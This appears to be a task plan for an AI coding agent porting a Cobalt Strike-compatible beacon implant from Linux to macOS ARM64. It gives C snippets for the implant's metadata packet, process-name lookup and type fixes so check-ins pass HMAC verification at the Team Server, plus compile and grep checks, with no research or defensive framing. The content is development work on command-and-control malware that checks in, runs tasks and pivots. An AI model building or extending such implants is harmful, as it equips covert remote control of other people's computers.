---
phase: 06-macos-tree-scaffold-and-build-system
plan: 02
type: execute
wave: 2
depends_on:
  - 06-01
files_modified:
  - implant-macos/src/beacon.c
  - implant-macos/src/main.c
autonomous: true
requirements:
  - MAC-04
  - MAC-06

must_haves:
  truths:
    - "implant-macos/src/beacon.c uses getprogname() for process name — no /proc/self/status reference"
    - "implant-macos/src/beacon.c declares var4, var5, var6 as uint32_t (not uint16_t)"
    - "implant-macos/src/beacon.c has no #include for ELFRunner_include.h or any ELFLoader header"
    - "implant-macos/src/main.c debug string reads macOS ARM64 Beacon, not Linux Cobalt Strike Beacon"
    - "Both files compile with zero warnings under clang -Wall -Wextra -arch arm64 (excluding missing commands.c)"
  artifacts:
    - path: "implant-macos/src/beacon.c"
      provides: "macOS-specific metadata generation, RSA/AES/HMAC beacon operations"
      contains: "getprogname()"
    - path: "implant-macos/src/main.c"
      provides: "macOS beacon entry point and main loop"
      contains: "macOS ARM64 Beacon"
  key_links:
    - from: "implant-macos/src/beacon.c"
      to: "getprogname()"
      via: "direct call in beacon_generate_metadata()"
      pattern: "getprogname\\(\\)"
    - from: "implant-macos/src/beacon.c"
      to: "uint32_t var4, var5, var6"
      via: "local variable declarations in beacon_generate_metadata()"
      pattern: "uint32_t var[456]"
---

<objective>
Write the two macOS-specific source file rewrites that differ functionally from their Linux
counterparts: beacon.c (process name fix + uint32_t type fix) and main.c (cosmetic string).

This plan contains the most security-critical changes for Phase 6:
- The getprogname() replacement directly addresses MAC-06 (process name correctness)
- The uint32_t fix directly addresses MAC-04 (metadata packet type correctness)
Both bugs, if left uncorrected, produce a beacon that either shows wrong metadata or
fails HMAC verification at the Team Server.

Purpose: After this plan completes, beacon.c and main.c are ready. Plan 06-03 adds commands.c,
after which make -C implant-macos produces a complete Mach-O ARM64 binary.

Output: implant-macos/src/beacon.c and implant-macos/src/main.c
</objective>

<execution_context>
@/Users/maleick/.claude/get-shit-done/workflows/execute-plan.md
@/Users/maleick/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/research/ARCHITECTURE.md
@.planning/research/PITFALLS.md
@.planning/research/STACK.md
@.planning/phases/06-macos-tree-scaffold-and-build-system/06-01-SUMMARY.md

<interfaces>
<!-- Critical source context for the macOS beacon.c rewrite. -->
<!-- Read implant/src/beacon.c fully before writing implant-macos/src/beacon.c. -->

From implant/src/beacon.c — sections requiring macOS changes:

1. PROCESS NAME (lines ~244-258) — MUST CHANGE:
   Linux code (DO NOT COPY):
   ```c
   char procname[32] = { 0 };
   FILE* fileptr = fopen("/proc/self/status", "r");
   if (fileptr == NULL) {
       snprintf(procname, sizeof(procname), "linuxbeacon");
   } else {
       char tmp[40];
       if (fgets(tmp, sizeof(tmp), fileptr))
           sscanf(tmp, "Name:%31s", procname);
       fclose(fileptr);
   }
   ```

   macOS replacement (USE THIS):
   ```c
   char procname[32] = { 0 };
   /* macOS: getprogname() replaces /proc/self/status — available since macOS 10.4 */
   const char *gp = getprogname();
   if (gp) {
       snprintf(procname, sizeof(procname), "%s", gp);
   } else {
       snprintf(procname, sizeof(procname), "macosbeacon");
   }
   ```
   getprogname() is declared in <stdlib.h> which is already included.

2. VAR4/VAR5/VAR6 TYPE FIX (lines ~216-226) — MUST CHANGE:
   Linux code (BUGGY — DO NOT COPY):
   ```c
   uint16_t var4 = htonl((uint16_t)0x7ffc);
   memcpy(metadata + offset, &var4, 4);  // BUG: reads 4 bytes from 2-byte var
   offset += 4;
   uint16_t var5 = htons((uint16_t)0xfae2f3f0);
   memcpy(metadata + offset, &var5, 4);  // BUG: same issue
   offset += 4;
   uint16_t var6 = htons((uint16_t)0xfae2b200);
   memcpy(metadata + offset, &var6, 4);  // BUG: same issue
   offset += 4;
   ```

   macOS fix (USE THIS — uint32_t + htonl, 4-byte memcpy):
   ```c
   uint32_t var4 = htonl((uint32_t)0x7ffc);
   memcpy(metadata + offset, &var4, 4);
   offset += 4;
   uint32_t var5 = htonl((uint32_t)0xfae2f3f0);
   memcpy(metadata + offset, &var5, 4);
   offset += 4;
   uint32_t var6 = htonl((uint32_t)0xfae2b200);
   memcpy(metadata + offset, &var6, 4);
   offset += 4;
   ```
   Note: var5 and var6 used htons() in the Linux version (wrong — these are 4-byte fields).
   All three MUST use htonl() with uint32_t in the macOS version.

3. EVERYTHING ELSE IN beacon.c — COPY VERBATIM from implant/src/beacon.c:
   - beacon_get_local_ip() using getifaddrs() — works on macOS unchanged
   - beacon_init(), beacon_cleanup(), beacon_sleep() — POSIX, unchanged
   - beacon_checkin(), beacon_send_output(), beacon_decrypt_tasks() — OpenSSL API, unchanged
   - BEACON_PUBLIC_KEY stub array — unchanged
   - All #include statements — same set (getprogname is in <stdlib.h> already included)
   - uname() call for hostname — works on macOS; Darwin kernel version in OS fields is
     acceptable at Phase 6 (sysctlbyname for human-readable version is Phase 7)

From implant/src/main.c — section requiring macOS change:

   Line 14: #define IMPLANT_VERSION "v2.3.7"   (keep)
   Line 50: DEBUG_PRINT("Linux Cobalt Strike Beacon %s\n", IMPLANT_VERSION);
            CHANGE TO: DEBUG_PRINT("macOS ARM64 Beacon %s\n", IMPLANT_VERSION);

   All other main.c code copies verbatim. The loop structure, signal handlers,
   beacon_init/beacon_checkin/pivot_init/pivot_poll/pivot_cleanup calls are all POSIX/unchanged.
   usleep(10000) is present in macOS SDK — no change needed.
   No /proc references in main.c.
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Write implant-macos/src/beacon.c — getprogname() fix + uint32_t type fix</name>
  <files>
    implant-macos/src/beacon.c
  </files>
  <action>
    Read implant/src/beacon.c in full first. Then write implant-macos/src/beacon.c as a
    macOS-specific rewrite with EXACTLY TWO functional changes and the sync comment header.

    Begin the file with:
    /* macOS ARM64 rewrite of implant/src/beacon.c — last synced 2026-02-26
     * Changes from Linux version:
     *   1. getprogname() replaces /proc/self/status for process name (MAC-06)
     *   2. var4/var5/var6 declared as uint32_t + htonl() — fixes uint16_t/htonl mismatch (MAC-04)
     * All other code is identical to the Linux version.
     */

    CHANGE 1 — Process name (MAC-06):
    Replace the /proc/self/status block with getprogname(). See <interfaces> section for the
    exact replacement code. Do NOT use #ifdef __APPLE__ — this file is macOS-only by design,
    in the implant-macos/ tree where no cross-platform guards are needed.

    CHANGE 2 — uint32_t type fix (MAC-04):
    Replace the three uint16_t var4/var5/var6 declarations with uint32_t. Change var5 and var6
    from htons() to htonl(). See <interfaces> for exact code. This ensures the 4-byte memcpy
    reads from a properly-sized variable on Clang/ARM64 where GCC's accidental stack layout
    no longer saves us.

    EVERYTHING ELSE:
    Copy verbatim from implant/src/beacon.c. This includes:
    - All #include directives (same set — getprogname is in <stdlib.h> already present)
    - BEACON_PUBLIC_KEY array and BEACON_PUBLIC_KEY_LEN
    - All #define constants (METADATA_FLAG_*, HMAC_SIZE)
    - beacon_get_local_ip() — getifaddrs() with AF_INET is identical on macOS
    - beacon_init() — POSIX srand/getpid/memcpy, unchanged
    - beacon_cleanup() — identical
    - beacon_sleep() — usleep or nanosleep, identical on macOS
    - beacon_generate_metadata() — copy everything except the two changed sections
    - beacon_checkin() — libcurl calls via http_get/http_post, unchanged
    - beacon_send_output() — OpenSSL AES encrypt, unchanged
    - beacon_decrypt_tasks() — HMAC verify + AES decrypt, unchanged
    - rand32() — unchanged
    - All extern declarations (g_sleep_time_ms, g_jitter_percent)

    Do NOT add any macOS-only headers not in the Linux version (getprogname is in stdlib.h).
    Do NOT add #ifdef __APPLE__ guards — this tree is macOS-only.
    Do NOT change the uname() call for OS version — Darwin kernel version is acceptable
    at Phase 6; the sysctlbyname() improvement is Phase 7 scope.
  </action>
  <verify>
    Run: clang -Wall -Wextra -O2 -arch arm64 \
      -I./implant-macos/headers \
      -I./implant-macos/generated \
      -I$(brew --prefix openssl@3)/include \
      -I$(brew --prefix curl)/include \
      -c implant-macos/src/beacon.c \
      -o /tmp/beacon-macos.o 2>&1
    Expected: zero output (no warnings, no errors)

    Run: grep -n "proc/self/status\|linuxbeacon" implant-macos/src/beacon.c
    Expected: no output (Linux /proc reference completely absent)

    Run: grep -n "getprogname" implant-macos/src/beacon.c
    Expected: at least one match (the replacement call)

    Run: grep -n "uint16_t var[456]" implant-macos/src/beacon.c
    Expected: no output (all three vars are now uint32_t)

    Run: grep -n "uint32_t var[456]" implant-macos/src/beacon.c
    Expected: three matches (var4, var5, var6)

    Run: grep -n "ELFRunner\|elfloader" implant-macos/src/beacon.c
    Expected: no output
  </verify>
  <done>
    implant-macos/src/beacon.c compiles clean with zero Clang warnings under -Wall -Wextra -arch arm64.
    No /proc/self/status references. getprogname() present. var4/var5/var6 are uint32_t.
    No ELFLoader references.
  </done>
</task>

<task type="auto">
  <name>Task 2: Write implant-macos/src/main.c — cosmetic version string change</name>
  <files>
    implant-macos/src/main.c
  </files>
  <action>
    Read implant/src/main.c in full first. Write implant-macos/src/main.c with exactly
    ONE functional change and the sync comment header.

    Begin the file with:
    /* macOS ARM64 rewrite of implant/src/main.c — last synced 2026-02-26
     * Changes from Linux version:
     *   1. DEBUG_PRINT version string updated to "macOS ARM64 Beacon" (operator identification)
     * All other code is identical to the Linux version.
     */

    CHANGE 1 — Version string (cosmetic):
    Line: DEBUG_PRINT("Linux Cobalt Strike Beacon %s\n", IMPLANT_VERSION);
    Replace with: DEBUG_PRINT("macOS ARM64 Beacon %s\n", IMPLANT_VERSION);

    EVERYTHING ELSE copies verbatim from implant/src/main.c:
    - All #include directives
    - #define IMPLANT_VERSION "v2.3.7" (keep as-is)
    - static int running = 1
    - beacon_state_t *g_beacon_state = NULL
    - int g_sleep_time_ms = SLEEP_TIME
    - int g_jitter_percent = JITTER
    - pivot_callback_func forward declaration
    - signal_handler function
    - main() function with entire loop body

    The main() body is fully macOS-compatible as written:
    - usleep(10000) — present in macOS SDK <unistd.h>
    - profile_load(), beacon_init(), pivot_init() — same function signatures
    - beacon_checkin(), download_poll(), pivot_poll(), beacon_sleep() — same
    - signal(SIGINT/SIGTERM) — POSIX, unchanged
    - beacon_cleanup(), pivot_cleanup() — same
    No /proc references in main.c.
  </action>
  <verify>
    Run: clang -Wall -Wextra -O2 -arch arm64 \
      -I./implant-macos/headers \
      -I./implant-macos/generated \
      -I$(brew --prefix openssl@3)/include \
      -I$(brew --prefix curl)/include \
      -c implant-macos/src/main.c \
      -o /tmp/main-macos.o 2>&1
    Expected: zero output (no warnings, no errors)

    Run: grep "macOS ARM64 Beacon" implant-macos/src/main.c
    Expected: one match (the updated version string)

    Run: grep "Linux Cobalt Strike Beacon" implant-macos/src/main.c
    Expected: no output (Linux string replaced)

    Run: grep -n "proc/self\|ELFRunner" implant-macos/src/main.c
    Expected: no output
  </verify>
  <done>
    implant-macos/src/main.c compiles clean with zero Clang warnings under -Wall -Wextra -arch arm64.
    Version string reads "macOS ARM64 Beacon". No Linux-specific strings or /proc references.
  </done>
</task>

</tasks>

<verification>
After both tasks complete, verify both files compile individually:

clang -Wall -Wextra -O2 -arch arm64 \
  -I./implant-macos/headers -I./implant-macos/generated \
  -I$(brew --prefix openssl@3)/include -I$(brew --prefix curl)/include \
  -c implant-macos/src/beacon.c -o /tmp/beacon-macos.o 2>&1
Expected: zero output

clang -Wall -Wextra -O2 -arch arm64 \
  -I./implant-macos/headers -I./implant-macos/generated \
  -I$(brew --prefix openssl@3)/include -I$(brew --prefix curl)/include \
  -c implant-macos/src/main.c -o /tmp/main-macos.o 2>&1
Expected: zero output

grep -c "getprogname" implant-macos/src/beacon.c — must be >= 1
grep -c "uint32_t var4" implant-macos/src/beacon.c — must be 1
grep -c "uint32_t var5" implant-macos/src/beacon.c — must be 1
grep -c "uint32_t var6" implant-macos/src/beacon.c — must be 1
grep -c "proc/self/status" implant-macos/src/beacon.c — must be 0
grep -c "macOS ARM64 Beacon" implant-macos/src/main.c — must be 1
</verification>

<success_criteria>
- implant-macos/src/beacon.c: getprogname() replaces /proc/self/status (MAC-06 satisfied)
- implant-macos/src/beacon.c: var4/var5/var6 are uint32_t + htonl() (MAC-04 satisfied)
- Both files compile with zero Clang warnings under -Wall -Wextra -arch arm64
- implant-macos/src/main.c: version string identifies as macOS ARM64 Beacon
- Neither file contains any /proc, ELFRunner, or elfloader references
- Protocol semantics are byte-identical to the Linux version in all other respects
  (magic 0x0000BEEF, session key placement, agent_id, pid, flags, IP, info string)
</success_criteria>

<output>
After completion, create .planning/phases/06-macos-tree-scaffold-and-build-system/06-02-SUMMARY.md
</output>
